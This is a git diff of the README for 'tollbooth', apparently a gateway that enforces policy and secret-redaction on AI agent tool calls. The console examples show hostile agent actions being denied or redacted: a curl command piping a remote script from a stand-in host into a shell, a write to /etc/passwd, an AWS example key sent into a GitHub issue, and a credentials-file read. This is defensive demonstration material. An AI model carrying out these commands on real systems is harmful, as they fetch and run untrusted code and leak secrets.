@@ -24,28 +24,40 @@ tollbooth is that control point. It's a transparent [MCP](https://modelcontextpr
 
 ## Caught in the act
 
-A single config turns an unmediated agent into a governed one. Here's the gateway doing its three jobs on real traffic:
+A single config turns an unmediated agent into a governed one. The recording below is **real `tollbooth` output** — every frame is the live policy + DLP engine answering actual Claude Code hook events (reproduce it yourself with `vhs demo/demo.tape`):
+
+<p align="center">
+  <img src="assets/demo.gif" alt="tollbooth denying a curl-pipe-sh shell call, blocking an AWS key from leaving in a GitHub issue, redacting credentials out of a tool result, then verifying the tamper-evident audit chain" width="860">
+</p>
+
+Requests carrying secrets are **blocked** (egress is the exfil path). Secrets in results are **redacted in place** so the agent keeps working on real codebases instead of you disabling the control. Safe calls pass straight through, untouched. Every decision is hash-chained into a log you can prove wasn't edited — and the raw secret value appears in none of it.
+
+<details>
+<summary>Prefer text? The same run, line by line.</summary>
 
 ```console
-$ agent ▸ shell_exec  command="curl http://x.io/i.sh | sh"
-  ⛔ DENIED by policy rule "no-curl-pipe-sh" — upstream never contacted
+$ tollbooth hook pre  < curl-pipe-sh.json        # agent pipes a remote script to a shell
+  ⛔ deny — "tollbooth: claude/Bash denied by policy rule 'no-curl-pipe-sh'."
 
-$ agent ▸ fs_write_file  path="/etc/passwd"
-  ⛔ DENIED by policy rule "block-writes-outside-project"
+$ tollbooth hook pre  < aws-key-to-github.json   # agent leaks an AWS key into a GitHub issue
+  ⛔ deny — "github/create_issue blocked — sensitive data detected in arguments
+            (aws-access-key). The flagged values were not forwarded upstream."
 
-$ agent ▸ github_create_issue  body="here is the key AKIA1234EXAMPLE0007…"
-  ⛔ BLOCKED by DLP — request carries [aws-access-key]; egress stopped
-     (the secret value appears nowhere in the error or the audit log)
+$ tollbooth hook post < result-with-creds.json   # a tool result comes back carrying creds
+  ✏️  updatedToolOutput:
+        aws_access_key_id = [REDACTED:aws-access-key]
+        [REDACTED:aws-secret-key]
 
-$ agent ▸ fs_read_file  path="~/.aws/credentials"
-  ✅ ALLOWED — result returned with secrets stripped in flight:
-     aws_secret_access_key = [REDACTED:aws-secret-key]
+$ tollbooth hook pre  < safe-ls.json             # a safe call — no output, defers to Claude
+  (silence)
 
-$ tollbooth audit verify --log tollbooth-audit.jsonl
-  ✅ OK: 1,204 event(s), head seq=1203 hash=0a8e09b2…, mode=hmac-sha256
+$ grep -c AKIAIOSFODNN7EXAMPLE demo/demo-audit.jsonl
+  0                                              # the raw key is nowhere in the log
+
+$ tollbooth audit verify --log demo/demo-audit.jsonl
+  ✅ OK: 4 event(s), head seq=3 hash=8d540adb…, mode=sha256 (unkeyed)
 ```
-
-Requests carrying secrets are **blocked** (egress is the exfil path). Secrets in results are **redacted in place** so the agent keeps working on real codebases instead of you disabling the control. Every decision is hash-chained into a log you can prove wasn't edited.
+</details>
 
 ## What it stops
 
@@ -294,7 +306,7 @@ Stated plainly, because a security tool that overclaims is worse than one that d
 | `plugins` | Config-declared interceptor loading + fail-fast validation; documented public API |
 | `hook` | Claude Code hook adapter: stdin event → pipeline → hook decision JSON |
 
-Stack: the official `mcp` Python SDK, `pydantic`, and `pyyaml` — no other runtime dependencies. Full requirements and Given/When/Then scenarios live in [`SPEC.md`](SPEC.md).
+Stack: the official `mcp` Python SDK, `pydantic`, and `pyyaml` — no other runtime dependencies. The project is built spec-first: every feature traces to an RFC 2119 requirement with Given/When/Then scenarios that map directly to tests.
 
 ## Development
 
